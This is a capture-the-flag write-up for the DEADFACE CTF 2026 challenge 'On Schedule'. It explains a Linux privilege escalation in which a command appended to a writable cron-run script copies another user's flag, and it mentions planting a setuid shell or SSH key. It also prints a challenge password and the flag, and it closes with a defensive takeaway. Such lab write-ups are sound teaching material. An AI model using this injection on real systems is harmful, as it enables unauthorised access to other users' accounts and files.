---
title: On Schedule
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Linux
  - Forensics
---

# On Schedule

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Hostbusters · Forensics / Linux priv-esc |
| **Points** | 200 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) · Lyna |

## Challenge

> `gh0st404` maintains a nightly collector script on `charon`. Another member runs it on a schedule. Use it to become the next user and read their flag.
>
> Submit the flag as `deadface{flag-text}`.

Access: `https://hostbusters.dctf.io/` (continuing from [Git Good](git-good.md))

## Solution

### 1. Checking cron jobs and script ownership

After escalating to `gh0st404` (password `Gh0stInTh3Sh3ll_404` from [Git Good](git-good.md)), checking `/etc/cron.d/` and `/opt` reveals a scheduled collector job that executes `/opt/scrape/collect.sh` as user **`sunstalker`**:

```bash
ls -la /opt/scrape/collect.sh
cat /etc/cron.d/*
```

Crucially, `/opt/scrape/collect.sh` is **owned and writable by `gh0st404`**, even though cron executes it under `sunstalker`'s UID.

### 2. Injecting a payload into `collect.sh`

Appending a command to `/opt/scrape/collect.sh` to copy `/home/sunstalker/flag.txt` (or drop a setuid shell / SSH key for `sunstalker`) and waiting for the cron tick:

```bash
echo 'cp /home/sunstalker/flag.txt /tmp/sunstalker.flag && chmod 644 /tmp/sunstalker.flag' >> /opt/scrape/collect.sh
```

Once the scheduled job runs as `sunstalker`, reading `/tmp/sunstalker.flag` (or switching into `sunstalker`) yields:

```text
deadface{cr0n_c4rr13d_my_p4yl04d}
```

## Flag

!!! flag "Flag"
    `deadface{cr0n_c4rr13d_my_p4yl04d}`

## Takeaways

Never run a cron job as user $B$ when the target script is writable by a lower-privileged user $A$. Any user with write access to a scheduled script effectively has code execution as the account running the cron job.
